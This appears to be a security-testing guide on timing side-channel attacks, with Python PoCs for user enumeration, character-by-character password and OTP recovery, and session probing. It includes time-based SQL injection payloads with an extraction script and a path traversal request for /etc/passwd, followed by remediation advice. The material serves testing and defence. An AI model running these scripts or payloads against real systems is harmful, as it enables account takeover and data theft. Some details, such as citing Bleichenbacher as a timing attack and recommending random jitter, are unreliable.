# Timing Attacks

## Description
Timing attacks are a type of side-channel attack where an attacker can discover information by analyzing the time it takes for a system to respond to different inputs. These attacks exploit variations in processing time to infer sensitive data such as valid usernames, password correctness, cryptographic keys, or internal system states.

## How Timing Attacks Work
When an application takes different amounts of time to process valid versus invalid inputs, attackers can measure these timing differences to gain information. For example:
- Valid username checks may take longer due to additional database queries
- Password verification may fail faster for wrong usernames than wrong passwords
- Token validation may reveal valid token formats through timing differences
- Cryptographic operations may leak information through processing time

## Common Vulnerabilities

### 1. **User Enumeration via Login Timing**
Login responses take different times for existing vs non-existing users.

### 2. **Password Verification Timing**
Password comparison stops at first wrong character (early return).

### 3. **Token Validation Timing**
Valid token format takes longer to process than invalid format.

### 4. **Cryptographic Key Discovery**
RSA, AES operations leak information through execution time.

### 5. **Database Query Timing**
Different query execution times reveal data existence.

### 6. **Cache Timing**
Cached vs uncached responses have different timing signatures.

### 7. **Session Validation Timing**
Valid session checks take longer than invalid session checks.

### 8. **OTP/PIN Verification Timing**
Character-by-character comparison reveals partial correctness.

## Common Attack Vectors
- Authentication endpoints (login, password reset)
- Token validation endpoints
- Search functionality
- Database queries
- Cryptographic operations
- Session management
- File existence checks
- Cache mechanisms

## Testing Methodology & PoC Examples

### PoC 1: User Enumeration via Login Timing

**Vulnerability:** Different response times for existing vs non-existing users.

**Steps to Test:**
1. Send login request with known existing username
2. Measure response time (e.g., 250ms)
3. Send login request with non-existing username
4. Measure response time (e.g., 50ms)
5. Significant difference indicates vulnerability

**Python Script:**
```python
import requests
import time

def measure_login_time(username, password):
    start = time.time()
    response = requests.post('https://example.com/login', 
        data={'username': username, 'password': password})
    end = time.time()
    return end - start

# Test with known existing user
existing_user_time = measure_login_time('admin', 'wrong_password')
print(f"Existing user time: {existing_user_time:.3f}s")

# Test with non-existing user
nonexistent_user_time = measure_login_time('nonexistent_user_12345', 'wrong_password')
print(f"Non-existing user time: {nonexistent_user_time:.3f}s")

# If difference is significant (>50ms), vulnerability exists
if abs(existing_user_time - nonexistent_user_time) > 0.05:
    print("Timing attack vulnerability detected!")
```

**Request Example:**
```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=test123
```

**Mitigation:** Use constant-time comparison and always perform same operations regardless of user existence.

---

### PoC 2: Password Length Discovery via Timing

**Vulnerability:** Password verification time increases with correct prefix length.

**Steps to Test:**
1. Try passwords of different lengths
2. Measure response time for each
3. Longer correct prefixes take more time
4. Incrementally discover password character by character

**Python Script:**
```python
import requests
import time
import string

def test_password_timing(username, password):
    times = []
    for _ in range(10):  # Multiple attempts for accuracy
        start = time.time()
        requests.post('https://example.com/login',
            data={'username': username, 'password': password})
        end = time.time()
        times.append(end - start)
    return sum(times) / len(times)  # Average time

# Brute force password character by character
known_password = ""
for position in range(20):  # Try up to 20 characters
    best_char = None
    longest_time = 0
    
    for char in string.ascii_letters + string.digits:
        test_password = known_password + char
        avg_time = test_password_timing('admin', test_password)
        
        if avg_time > longest_time:
            longest_time = avg_time
            best_char = char
    
    if best_char:
        known_password += best_char
        print(f"Discovered: {known_password}")
    else:
        break
```

---

### PoC 3: Token Validation Timing Attack

**Vulnerability:** Valid token format takes longer to validate.

**Steps to Test:**
1. Send requests with various token formats
2. Measure validation time
3. Valid format (even if expired) takes longer
4. Use timing to discover valid token structure

**Request Examples:**
```http
GET /api/validate?token=invalid_format HTTP/1.1
Host: example.com
# Fast response (5ms)

GET /api/validate?token=550e8400-e29b-41d4-a716-446655440000 HTTP/1.1
Host: example.com
# Slower response (50ms) - valid UUID format
```

**Python Script:**
```python
import requests
import time

tokens = [
    'invalid',
    '12345',
    'abc-def-ghi',
    '550e8400-e29b-41d4-a716-446655440000',  # Valid UUID
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',  # Valid JWT format
]

for token in tokens:
    start = time.time()
    response = requests.get(f'https://example.com/api/validate?token={token}')
    elapsed = time.time() - start
    print(f"Token: {token[:20]}... Time: {elapsed:.4f}s")
```

---

### PoC 4: Database Query Timing (SQL Timing Attack)

**Vulnerability:** Different query execution times reveal data.

**Steps to Test:**
1. Inject time-based SQL payloads
2. Measure response time
3. If condition is true, response is delayed
4. Extract data bit by bit

**SQL Timing Payloads:**
```sql
' OR IF(1=1, SLEEP(5), 0) --
' OR IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --
' AND IF((SELECT COUNT(*) FROM users)>10, SLEEP(5), 0) --
admin' AND IF(LENGTH(password)>8, BENCHMARK(5000000,SHA1('test')), 0) --
```

**Request:**
```http
POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

query=' OR IF(1=1, SLEEP(5), 0) --
```

**Python Script:**
```python
import requests
import time

def check_condition(condition):
    payload = f"' OR IF({condition}, SLEEP(5), 0) --"
    start = time.time()
    requests.post('https://example.com/search', data={'query': payload})
    elapsed = time.time() - start
    return elapsed > 5  # True if condition is true

# Extract database name length
for length in range(1, 50):
    if check_condition(f"LENGTH(DATABASE())={length}"):
        print(f"Database name length: {length}")
        break
```

---

### PoC 5: Cache Timing Attack

**Vulnerability:** Cached responses are faster than uncached.

**Steps to Test:**
1. Request resource multiple times
2. First request is slow (cache miss)
3. Subsequent requests are fast (cache hit)
4. Use timing to discover accessed resources

**Python Script:**
```python
import requests
import time

def check_cache_timing(url):
    # First request - potential cache miss
    start = time.time()
    requests.get(url)
    first_time = time.time() - start
    
    # Second request - potential cache hit
    start = time.time()
    requests.get(url)
    second_time = time.time() - start
    
    print(f"URL: {url}")
    print(f"First: {first_time:.4f}s, Second: {second_time:.4f}s")
    
    if second_time < first_time * 0.5:
        print("Likely cached!")
        return True
    return False

# Test various resources
resources = [
    'https://example.com/api/user/1',
    'https://example.com/api/user/2',
    'https://example.com/api/user/999',
]

for resource in resources:
    check_cache_timing(resource)
```

---

### PoC 6: OTP/PIN Brute Force via Timing

**Vulnerability:** Character-by-character OTP comparison.

**Steps to Test:**
1. Try OTPs with different first digits
2. Correct first digit takes slightly longer
3. Repeat for each position
4. Discover OTP digit by digit

**Python Script:**
```python
import requests
import time

def test_otp_timing(otp):
    times = []
    for _ in range(20):  # Multiple measurements
        start = time.time()
        requests.post('https://example.com/verify-otp',
            data={'otp': otp})
        times.append(time.time() - start)
    return sum(times) / len(times)

# Discover 6-digit OTP
discovered_otp = ""
for position in range(6):
    best_digit = None
    longest_time = 0
    
    for digit in range(10):
        test_otp = discovered_otp + str(digit) + "0" * (5 - position)
        avg_time = test_otp_timing(test_otp)
        
        if avg_time > longest_time:
            longest_time = avg_time
            best_digit = digit
    
    discovered_otp += str(best_digit)
    print(f"Discovered so far: {discovered_otp}")
```

---

### PoC 7: File Existence Check via Timing

**Vulnerability:** File existence affects response time.

**Steps to Test:**
1. Request files that may exist
2. Existing files take longer (file I/O)
3. Non-existing files fail fast
4. Enumerate file structure via timing

**Request:**
```http
GET /download?file=../../../etc/passwd HTTP/1.1
Host: example.com
# Slower if file exists and is accessed
```

---

### PoC 8: Session Validation Timing

**Vulnerability:** Valid sessions require more checks.

**Steps to Test:**
1. Send requests with various session IDs
2. Valid format sessions take longer to invalidate
3. Discover valid session ID patterns

**Python Script:**
```python
import requests
import time
import uuid

def check_session_timing(session_id):
    start = time.time()
    requests.get('https://example.com/api/data',
        cookies={'SESSIONID': session_id})
    return time.time() - start

# Test different session formats
session_times = {}
for _ in range(10):
    # Random UUID
    session_id = str(uuid.uuid4())
    timing = check_session_timing(session_id)
    session_times[session_id] = timing
    print(f"Session: {session_id} Time: {timing:.4f}s")

# Sessions with longer times might have valid format
sorted_sessions = sorted(session_times.items(), key=lambda x: x[1], reverse=True)
print("\nSlowest (potentially valid format):")
for session, timing in sorted_sessions[:3]:
    print(f"{session}: {timing:.4f}s")
```

---

### PoC 9: Cryptographic Timing Attack (RSA)

**Vulnerability:** RSA decryption time leaks private key information.

**Concept:**
- RSA operations time varies based on key bits
- Measure time for different ciphertext
- Statistical analysis reveals key bits

**Note:** This requires many measurements and statistical analysis. Real-world example: Bleichenbacher's attack.

---

### PoC 10: Rate Limiting Detection via Timing

**Vulnerability:** Rate limiting adds delay to responses.

**Steps to Test:**
1. Send requests rapidly
2. Measure response times
3. After threshold, responses become slower
4. Discover rate limit threshold

**Python Script:**
```python
import requests
import time

url = 'https://example.com/api/endpoint'
times = []

for i in range(100):
    start = time.time()
    response = requests.get(url)
    elapsed = time.time() - start
    times.append(elapsed)
    print(f"Request {i+1}: {elapsed:.4f}s")
    
    # Detect sudden increase in response time
    if len(times) > 10:
        avg_recent = sum(times[-10:]) / 10
        avg_early = sum(times[:10]) / 10
        if avg_recent > avg_early * 2:
            print(f"Rate limit detected around request {i+1}")
            break
```

---

## Tools for Testing

### 1. **Custom Python Scripts**
```python
import statistics
import requests
import time

def statistical_timing_attack(url, payloads):
    results = {}
    for payload in payloads:
        times = []
        for _ in range(50):  # 50 measurements for accuracy
            start = time.time()
            requests.post(url, data={'input': payload})
            times.append(time.time() - start)
        
        # Calculate statistics
        avg = statistics.mean(times)
        stdev = statistics.stdev(times)
        results[payload] = {'avg': avg, 'stdev': stdev}
    
    return results
```

### 2. **Burp Suite Intruder**
- Use "Pitchfork" attack type
- Add "Response received" column
- Sort by response time
- Look for patterns

### 3. **Timing Attack Tools**
```bash
# Using cURL with timing
for i in {1..100}; do
  curl -w "Time: %{time_total}s\n" -o /dev/null -s \
    "https://example.com/api/check?username=user$i"
done

# Using Apache Bench
ab -n 1000 -c 10 https://example.com/login

# Using wrk for timing analysis
wrk -t12 -c400 -d30s https://example.com/api
```

### 4. **Statistical Analysis Tools**
```python
import numpy as np
import matplotlib.pyplot as plt

# Analyze timing data
times_existing_users = [0.245, 0.248, 0.251, 0.247, 0.249]
times_nonexistent_users = [0.048, 0.051, 0.049, 0.050, 0.047]

print(f"Existing users avg: {np.mean(times_existing_users):.4f}s")
print(f"Non-existing users avg: {np.mean(times_nonexistent_users):.4f}s")

# Plot histogram
plt.hist(times_existing_users, alpha=0.5, label='Existing')
plt.hist(times_nonexistent_users, alpha=0.5, label='Non-existing')
plt.legend()
plt.xlabel('Response Time (s)')
plt.ylabel('Frequency')
plt.title('Timing Attack - User Enumeration')
plt.show()
```

## Exploitation Impact

- **Critical:** Password/key extraction, cryptographic attacks
- **High:** User enumeration, session discovery, data extraction
- **Medium:** Information disclosure, system behavior mapping
- **Privacy Impact:** Reveals user existence, activity patterns

## Remediation

### 1. **Constant-Time Operations**
```python
# Bad - Early return
def check_password(input_password, stored_password):
    if len(input_password) != len(stored_password):
        return False
    for i in range(len(input_password)):
        if input_password[i] != stored_password[i]:
            return False  # Early return leaks information
    return True

# Good - Constant-time comparison
import hmac

def check_password_secure(input_password, stored_password):
    return hmac.compare_digest(input_password.encode(), stored_password.encode())
```

### 2. **Normalize Response Times**
```python
import time
import random

def login(username, password):
    start_time = time.time()
    
    # Perform authentication
    result = authenticate(username, password)
    
    # Add random delay to normalize timing
    elapsed = time.time() - start_time
    target_time = 0.5  # Fixed response time
    if elapsed < target_time:
        time.sleep(target_time - elapsed + random.uniform(0, 0.05))
    
    return result
```

### 3. **Rate Limiting**
- Implement aggressive rate limiting on sensitive endpoints
- Use exponential backoff
- CAPTCHA after multiple attempts

### 4. **Identical Code Paths**
- Execute same operations for valid and invalid inputs
- Always query database even if username doesn't exist
- Always perform password hash comparison

### 5. **Timing Jitter**
```python
import random
import time

def add_timing_jitter():
    time.sleep(random.uniform(0.01, 0.05))
```

### 6. **Blinding Techniques**
- Use blinding in cryptographic operations
- Add random delays
- Use secure libraries (e.g., libsodium)

### 7. **Monitoring and Detection**
- Monitor for unusual timing patterns
- Detect rapid sequential requests
- Alert on systematic timing probes

### 8. **Use Secure Libraries**
- Use constant-time comparison functions
- Use timing-safe cryptographic libraries
- Follow OWASP guidelines

## References

- [OWASP - Timing Attacks](https://owasp.org/www-community/attacks/Timing_attack)
- [NIST - Side-Channel Attack](https://csrc.nist.gov/glossary/term/side_channel_attack)
- [Remote Timing Attacks are Practical](https://crypto.stanford.edu/~dabo/papers/ssl-timing.pdf)
- [Cache-Timing Attacks on AES](https://cr.yp.to/antiforgery/cachetiming-20050414.pdf)

## Payloads

See `timing-attacks-payloads.txt` for a comprehensive list of timing attack payloads and test cases.
